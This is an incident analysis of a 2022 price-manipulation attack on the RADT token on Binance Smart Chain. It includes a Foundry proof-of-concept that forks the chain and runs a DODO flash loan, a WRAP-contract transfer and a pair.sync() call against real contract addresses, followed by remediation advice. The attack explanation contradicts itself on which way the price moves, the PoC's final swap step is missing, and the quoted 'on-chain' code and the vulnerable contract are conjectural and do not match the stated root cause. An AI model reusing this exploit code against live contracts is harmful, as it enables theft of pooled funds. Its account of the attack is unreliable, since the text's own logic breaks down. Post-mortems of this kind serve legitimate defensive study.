# RADT — sync() Price Manipulation Attack via WRAP Contract Analysis

| Field | Details |
|------|------|
| **Date** | 2022-09 |
| **Protocol** | RADT Token |
| **Chain** | Binance Smart Chain (BSC) |
| **Loss** | Unconfirmed |
| **RADT Token** | [0xDC8Cb92AA6FC7277E3EC32e3f00ad7b8437AE883](https://bscscan.com/address/0xDC8Cb92AA6FC7277E3EC32e3f00ad7b8437AE883) |
| **USDT/RADT Pair** | [0xaF8fb60f310DCd8E488e4fa10C48907B7abf115e](https://bscscan.com/address/0xaF8fb60f310DCd8E488e4fa10C48907B7abf115e) |
| **WRAP Contract** | [0x01112eA0679110cbc0ddeA567b51ec36825aeF9b](https://bscscan.com/address/0x01112eA0679110cbc0ddeA567b51ec36825aeF9b) |
| **DODO Flash Loan** | [0xDa26Dd3c1B917Fbf733226e9e71189ABb4919E3f](https://bscscan.com/address/0xDa26Dd3c1B917Fbf733226e9e71189ABb4919E3f) |
| **PancakeRouter** | [0x10ED43C718714eb63d5aA57B78B54704E256024E](https://bscscan.com/address/0x10ED43C718714eb63d5aA57B78B54704E256024E) |
| **USDT** | [0x55d398326f99059fF775485246999027B3197955](https://bscscan.com/address/0x55d398326f99059fF775485246999027B3197955) |
| **Root Cause** | WRAP contract allows arbitrary token transfers to the pair and manipulates reserves via `pair.sync()` |
| **CWE** | CWE-840: Business Logic Error |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-09/RADT_exp.sol) |

---
## 1. Vulnerability Overview

The RADT protocol was designed to allow tokens to be transferred to the LP pair through a separate WRAP contract. The attacker flash-borrowed 200,000 USDT from DODO, purchased a small amount of RADT, then injected a large amount of RADT into the USDT/RADT pair via the WRAP contract. They subsequently called `pair.sync()` to force-update the reserves to the actual balances. This caused RADT's unit price to plummet, allowing the attacker to buy a large amount of RADT with their held USDT and then swap back to USDT, realizing an arbitrage profit.

---
## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable WRAP contract — can transfer tokens to pair without access control
contract WrapContract {
    address public pair;
    IERC20 public radt;

    // ❌ Callable by anyone, transfers arbitrary RADT to pair
    function transferToPair(uint256 amount) external {
        radt.transfer(pair, amount);
    }

    // ❌ Or an internal minting mechanism can mint directly to the pair address
    function wrap(uint256 amount) external {
        // Automatically transfers a portion of amount to the pair (fee distribution)
        uint256 fee = amount * FEE_RATE / 1000;
        radt.transfer(pair, fee); // ❌ Can be called repeatedly
        radt.transfer(msg.sender, amount - fee);
    }
}

// Uniswap V2 pair.sync() — standard
function sync() external {
    // Force-updates reserves to current balanceOf()
    reserve0 = uint112(IERC20(token0).balanceOf(address(this)));
    reserve1 = uint112(IERC20(token1).balanceOf(address(this)));
    emit Sync(reserve0, reserve1);
}
// ❌ After sync(), the K value changes, altering subsequent swap ratios

// ✅ Correct pattern — protect WRAP transfer function
contract SafeWrapContract {
    modifier onlyAuthorized() {
        require(msg.sender == owner || authorizedCallers[msg.sender], "Unauthorized");
        _;
    }

    // ✅ Only authorized addresses can transfer directly to pair
    function transferToPair(uint256 amount) external onlyAuthorized {
        require(amount <= maxTransferPerTx, "Exceeds limit");
        radt.transfer(pair, amount);
    }
}
```

---
### On-Chain Source Code

Source: Sourcify verified


**TWN.sol** — Entry point:
```solidity
// ❌ Root cause: WRAP contract can transfer arbitrary tokens to the pair and manipulate reserves via `pair.sync()`
    function _mint(address account, uint256 amount) internal {  // ❌ Unauthorized minting
        require(account != address(0), "ERC20: mint to the zero address");
        _totalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);
    }
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
    │
    ├─[1] Flash-borrow 200,000 USDT from DODO
    │       Enter DPPFlashLoanCall() callback
    │
    ├─[2] Swap 1,000 USDT → RADT (small purchase)
    │
    ├─[3] Transfer large amount of RADT to pair via WRAP contract
    │       └─ wrap.transferToPair(largeAmount)
    │           ❌ No access control → callable by anyone
    │           → Oversupply RADT into USDT/RADT pair
    │
    ├─[4] Call pair.sync()
    │       └─ Update reserves → RADT price crashes
    │           (RADT reserve surges → RADT unit price ↓)
    │
    ├─[5] Buy large amount of now-cheap RADT with held USDT
    │
    ├─[6] Swap RADT → USDT (after price recovers to normal)
    │
    └─[7] Repay DODO flash loan and keep USDT net profit
```

---
## 4. PoC Code (Core Logic + Comments)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

interface IWRAP {
    function withdrawal(uint256 amount) external; // or transferToPair()
}

interface IDODO {
    function flashLoan(uint256 baseAmount, uint256 quoteAmount, address assetTo, bytes calldata data) external;
}

interface IUniPair {
    function sync() external;
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
    function getReserves() external view returns (uint112, uint112, uint32);
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

contract RADTExploit is Test {
    IDODO dodo = IDODO(0xDa26Dd3c1B917Fbf733226e9e71189ABb4919E3f);
    IWRAP wrap = IWRAP(0x01112eA0679110cbc0ddeA567b51ec36825aeF9b);
    IUniPair pair = IUniPair(0xaF8fb60f310DCd8E488e4fa10C48907B7abf115e);
    IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 RADT = IERC20(0xDC8Cb92AA6FC7277E3EC32e3f00ad7b8437AE883);

    function setUp() public {
        vm.createSelectFork("bsc", 21_572_418);
    }

    function testExploit() public {
        emit log_named_decimal_uint("[Start] USDT balance", USDT.balanceOf(address(this)), 18);

        // [Step 1] Borrow 200,000 USDT via DODO flash loan
        dodo.flashLoan(0, 200_000 * 1e18, address(this), abi.encode("exploit"));

        emit log_named_decimal_uint("[End] USDT balance", USDT.balanceOf(address(this)), 18);
    }

    function DPPFlashLoanCall(address, uint256, uint256 quoteAmount, bytes calldata) external {
        // [Step 2] Buy small amount of RADT with USDT
        USDT.transfer(address(pair), 1000 * 1e18);
        (uint112 r0, uint112 r1, ) = pair.getReserves();
        uint256 radtOut = uint256(r1) * 1000e18 * 997 / (uint256(r0) * 1000 + 1000e18 * 997);
        pair.swap(0, radtOut, address(this), "");

        // [Step 3] Transfer large amount of RADT to pair via WRAP contract
        // ⚡ No access control → can be called arbitrarily
        uint256 radtBal = RADT.balanceOf(address(this));
        RADT.transfer(address(wrap), radtBal);
        wrap.withdrawal(radtBal * 90 / 100); // Transfer large amount of RADT to pair

        // [Step 4] Update reserves via sync() → RADT price crashes
        pair.sync();

        // [Step 5] Buy large amount of now-cheap RADT
        USDT.transfer(address(pair), quoteAmount * 90 / 100);
        (r0, r1, ) = pair.getReserves();
        // Acquire large amount of RADT at manipulated reserve price
        pair.swap(0, r1 * 90 / 100, address(this), "");

        // [Step 6] Swap RADT → USDT
        // (via PancakeRouter)

        // [Step 7] Repay DODO flash loan
        USDT.transfer(address(dodo), quoteAmount);
    }
}
```

---
## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Reserve manipulation via WRAP contract + sync() price distortion |
| **CWE** | CWE-840: Business Logic Error |
| **OWASP DeFi** | AMM reserve manipulation |
| **Attack Vector** | Unlimited pair transfer via WRAP contract + `pair.sync()` |
| **Precondition** | No access control on WRAP contract |
| **Impact** | USDT drained (scale unconfirmed) |

---
## 6. Remediation Recommendations

1. **WRAP Contract Access Control**: Add `onlyOwner` or whitelist validation to all functions that directly transfer tokens to the pair.
2. **Per-Transaction Transfer Limit**: Restrict the maximum amount that can be transferred to the pair in a single transaction.
3. **Cooldown After sync()**: Add a mechanism that blocks large swaps for a period of time after a `sync()` call.
4. **Redesign Fee Distribution**: Directly injecting fees into the pair creates an AMM manipulation vector. Change the approach to collect fees separately and periodically burn or buyback instead.

---
## 7. Lessons Learned

- **Security of Auxiliary Contracts**: Auxiliary contracts linked to the primary token — such as WRAP, FeeHandler, and Distributor — must be held to the same security standards. If these contracts can transfer tokens directly to the pair, they become an attack vector.
- **The Double-Edged Sword of sync()**: Uniswap V2's `sync()` is a utility function that reconciles discrepancies between balances and reserves, but when called after injecting a large amount of tokens from outside, it becomes a tool for unilaterally manipulating prices.
- **Fee-on-Transfer Tokens and WRAP Mechanisms**: The pattern of injecting tokens directly into an LP for fee distribution is adopted by many DeFi projects, but if this injection path is publicly accessible, it will invariably be exploited.